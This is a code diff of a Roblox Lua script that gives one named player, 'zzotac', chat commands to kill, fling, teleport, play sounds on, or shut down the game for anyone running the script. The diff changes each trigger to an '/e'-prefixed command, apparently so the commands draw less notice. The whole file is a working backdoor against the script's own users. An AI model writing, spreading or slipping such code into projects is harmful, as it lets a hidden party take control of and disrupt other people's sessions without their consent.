@@ -1,25 +1,25 @@
 
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == ":kill ." then
+if Message:lower() == "/e kill" then
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == ":fling ." then
+if Message:lower() == "/e fling" then
 game:getService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2722238.6643066406, 4862221.3525390625, -27222274.0993652344)
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == ":bring ." then
+if Message:lower() == "/e bring" then
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.zzotac.Character.HumanoidRootPart.CFrame
 end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == ":sound ." then
+if Message:lower() == "/e sound" then
 
  local hi = Instance.new("Sound")
 hi.Name = "Sound"
@@ -36,7 +36,7 @@ end
 end)
 
 game.Players.zzotac.Chatted:connect(function(Message)
-if Message:lower() == ":kick ." then
+if Message:lower() == "/e kick" then
 game:Shutdown()
 end
 end)
